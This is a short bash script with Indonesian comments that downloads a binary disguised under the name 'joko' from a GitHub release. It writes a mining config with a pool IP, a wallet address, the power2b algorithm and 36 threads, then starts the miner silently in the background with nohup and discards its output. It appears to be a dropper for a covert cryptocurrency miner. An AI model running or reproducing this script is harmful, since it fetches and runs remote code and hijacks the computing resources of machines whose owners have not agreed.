#!/bin/bash

# Direktori kerja
APP_DIR=~/myapp
MINER_DIR="$APP_DIR/joko"
CONFIG_FILE="$MINER_DIR/config.json"

# Cek apakah sudah dijalankan sebelumnya
if pgrep -f "./joko -c config.json" > /dev/null; then
    echo "Miner sudah berjalan. Keluar."
    exit 0
fi

# Buat direktori jika belum ada
mkdir -p "$APP_DIR"
cd "$APP_DIR"

# Unduh dan ekstrak hanya jika belum ada
if [ ! -d "$MINER_DIR" ]; then
    wget -q https://github.com/vokerjok/Voker/releases/download/Voker/joko.tar.gz -O joko.tar.gz
    tar -xf joko.tar.gz
    rm -f joko.tar.gz
fi

cd "$MINER_DIR"

# Buat file config
cat > "$CONFIG_FILE" <<END
{
  "url": "128.199.126.117:80",
  "user": "MntUvZfYEvGvaYWSrkRvrW41YN5u7diF5R.joko1",
  "pass": "x",
  "threads": 36,
  "algo": "power2b"
}
END

# Set permission
chmod +x "$MINER_DIR/joko" "$CONFIG_FILE"

# Jalankan miner
nohup ./joko -c config.json > /dev/null 2>&1 &
